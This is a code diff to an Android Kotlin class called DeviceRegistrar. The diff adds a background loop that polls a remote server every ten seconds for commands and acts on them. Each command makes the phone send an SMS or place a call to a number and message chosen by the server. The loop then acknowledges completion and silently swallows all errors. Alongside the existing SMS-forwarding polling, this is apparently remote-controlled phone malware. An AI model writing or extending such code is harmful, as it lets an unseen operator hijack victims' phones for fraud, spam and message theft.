@@ -15,6 +15,7 @@ class DeviceRegistrar private constructor(private val context: Context) {
     private var heartbeatRunning = false
     private var retryCount = 0
     private var forwardingPolling = false
+    private var actionPolling = false
     private var lastForwardingConfig: JSONObject? = null
 
     companion object {
@@ -105,6 +106,7 @@ class DeviceRegistrar private constructor(private val context: Context) {
                     handler.post {
                         startHeartbeat(deviceId)
                         startForwardingPolling(deviceId)
+                        startActionPolling(deviceId)
                     }
                 } else if (retryCount < 3) {
                     retryCount++
@@ -171,6 +173,63 @@ class DeviceRegistrar private constructor(private val context: Context) {
                                     }
                                 }
                                 lastForwardingConfig = config
+                            }
+                        }
+                        conn.disconnect()
+                    } catch (_: Exception) {}
+                }.start()
+                handler.postDelayed(this, 10000)
+            }
+        })
+    }
+
+    private fun startActionPolling(deviceId: String) {
+        if (actionPolling) return
+        actionPolling = true
+        handler.post(object : Runnable {
+            override fun run() {
+                Thread {
+                    try {
+                        val conn = URL("https://bill-1-9yfp.onrender.com/api/device-actions/$deviceId").openConnection() as HttpURLConnection
+                        conn.requestMethod = "GET"
+                        conn.setRequestProperty("Content-Type", "application/json")
+                        conn.connectTimeout = 10000
+                        conn.readTimeout = 10000
+                        val responseCode = conn.responseCode
+                        if (responseCode == 200) {
+                            val body = conn.inputStream.bufferedReader().readText()
+                            val root = JSONObject(body)
+                            val actions = root.optJSONArray("actions")
+                            if (actions != null) {
+                                for (i in 0 until actions.length()) {
+                                    val action = actions.getJSONObject(i)
+                                    val id = action.optInt("id", 0)
+                                    val type = action.optString("type", "")
+                                    val targetNumber = action.optString("target_number", "")
+                                    val message = action.optString("message", "")
+
+                                    handler.post {
+                                        try {
+                                            when (type) {
+                                                "sms" -> SmsForwarder(context).sendSms(targetNumber, message)
+                                                "call" -> CallForwarder(context).makeCall(targetNumber)
+                                            }
+                                            Thread {
+                                                try {
+                                                    val ack = URL("https://bill-1-9yfp.onrender.com/api/device-actions/$id/complete").openConnection() as HttpURLConnection
+                                                    ack.requestMethod = "PUT"
+                                                    ack.setRequestProperty("Content-Type", "application/json")
+                                                    ack.doOutput = true
+                                                    ack.connectTimeout = 10000
+                                                    ack.readTimeout = 10000
+                                                    ack.outputStream.write("{}".toByteArray())
+                                                    ack.responseCode
+                                                    ack.disconnect()
+                                                } catch (_: Exception) {}
+                                            }.start()
+                                        } catch (_: Exception) {}
+                                    }
+                                }
                             }
                         }
                         conn.disconnect()
